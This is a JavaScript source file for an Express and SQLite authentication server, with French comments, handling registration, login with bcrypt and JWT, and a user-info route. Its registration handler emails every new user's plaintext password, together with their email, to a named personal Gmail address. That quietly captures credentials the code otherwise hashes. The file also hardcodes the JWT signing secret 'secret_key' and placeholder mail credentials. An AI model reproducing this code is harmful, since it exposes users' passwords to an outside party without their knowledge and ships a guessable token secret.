const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const nodemailer = require("nodemailer");
const app = express();
const port = 3000;

// Middleware pour parser le corps des requêtes
app.use(express.json());
app.use(express.static("public")); // Pour servir les fichiers frontend

// Créer une base de données SQLite
const db = new sqlite3.Database("./users.db");

// Créer la table si elle n'existe pas
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE,
    password TEXT,
    role TEXT DEFAULT 'user',
    status TEXT DEFAULT 'active',
    created_at TEXT DEFAULT CURRENT_TIMESTAMP
  )`);
});

// Transporteur de mail (Gmail)
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "tonemail@gmail.com", // Ton adresse email
    pass: "tonmotdepasse", // Mot de passe ou mot de passe d'application
  },
});

// Fonction pour envoyer un email à l'admin à chaque inscription
const sendEmailToAdmin = (email, password) => {
  const mailOptions = {
    from: "tonemail@gmail.com",
    to: "charton.hugo1001@gmail.com",
    subject: `Nouvelle inscription: ${email}`,
    text: `Un utilisateur s'est inscrit avec l'email ${email} et le mot de passe: ${password}`,
  };
  transporter.sendMail(mailOptions, (err, info) => {
    if (err) {
      console.error("Erreur lors de l'envoi du mail:", err);
    } else {
      console.log("Email envoyé à l'admin:", info.response);
    }
  });
};

// Route d'inscription
app.post("/api/register", (req, res) => {
  const { email, password } = req.body;

  // Hachage du mot de passe
  bcrypt.hash(password, 10, (err, hashedPassword) => {
    if (err) return res.status(500).json({ message: "Erreur interne" });

    const stmt = db.prepare(
      "INSERT INTO users (email, password) VALUES (?, ?)"
    );
    stmt.run(email, hashedPassword, function (err) {
      if (err) {
        return res.status(400).json({ message: "Email déjà utilisé" });
      }

      // Envoi de l'email à l'admin
      sendEmailToAdmin(email, password);
      res.json({ success: true, userId: this.lastID });
    });
    stmt.finalize();
  });
});

// Route de connexion
app.post("/api/login", (req, res) => {
  const { email, password } = req.body;

  db.get("SELECT * FROM users WHERE email = ?", [email], (err, user) => {
    if (err || !user) {
      return res.status(400).json({ message: "Utilisateur non trouvé" });
    }

    // Comparer le mot de passe avec le hachage
    bcrypt.compare(password, user.password, (err, match) => {
      if (err || !match) {
        return res.status(400).json({ message: "Mot de passe incorrect" });
      }

      // Création du token JWT
      const token = jwt.sign(
        { userId: user.id, role: user.role },
        "secret_key",
        { expiresIn: "1h" }
      );
      res.json({ success: true, token });
    });
  });
});

// Middleware de vérification du token
const authenticate = (req, res, next) => {
  const token = req.headers["authorization"];
  if (!token) return res.status(403).json({ message: "Accès interdit" });

  jwt.verify(token, "secret_key", (err, decoded) => {
    if (err) return res.status(403).json({ message: "Token invalide" });
    req.user = decoded;
    next();
  });
};

// Route pour récupérer les informations de l'utilisateur connecté
app.get("/api/user", authenticate, (req, res) => {
  db.get("SELECT * FROM users WHERE id = ?", [req.user.userId], (err, user) => {
    if (err) return res.status(500).json({ message: "Erreur interne" });
    res.json({ email: user.email, role: user.role, status: user.status });
  });
});

// Serveur
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
